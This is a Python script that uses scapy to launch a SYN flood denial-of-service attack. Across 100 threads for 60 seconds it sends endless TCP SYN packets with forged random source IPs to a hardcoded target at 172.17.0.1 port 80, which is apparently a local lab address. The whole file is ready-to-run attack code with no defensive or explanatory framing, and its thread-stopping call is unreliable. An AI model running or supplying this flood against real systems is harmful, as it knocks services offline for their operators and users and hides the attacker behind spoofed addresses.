from scapy.all import *
import random
import threading
import time

def random_ip():
    """Generate a random IP address."""
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def send_syn(target_ip, target_port):
    """Send SYN packets to the specified IP and port."""
    while True:
        ip_layer = IP(src=random_ip(), dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

def flood(target_ip, target_port, duration, num_threads):
    """Start the SYN flood attack using multiple threads."""
    threads = []
    print(f"Starting the SYN flood attack on {target_ip}:{target_port} with {num_threads} threads")
    for _ in range(num_threads):
        thread = threading.Thread(target=send_syn, args=(target_ip, target_port))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    time.sleep(duration)  

    print("Attack finished. Stopping threads...")
    for thread in threads:
        thread._stop()  

if __name__ == "__main__":
    target_ip = '172.17.0.1'  
    target_port = 80
    duration = 60  
    num_threads = 100  
    flood(target_ip, target_port, duration, num_threads)
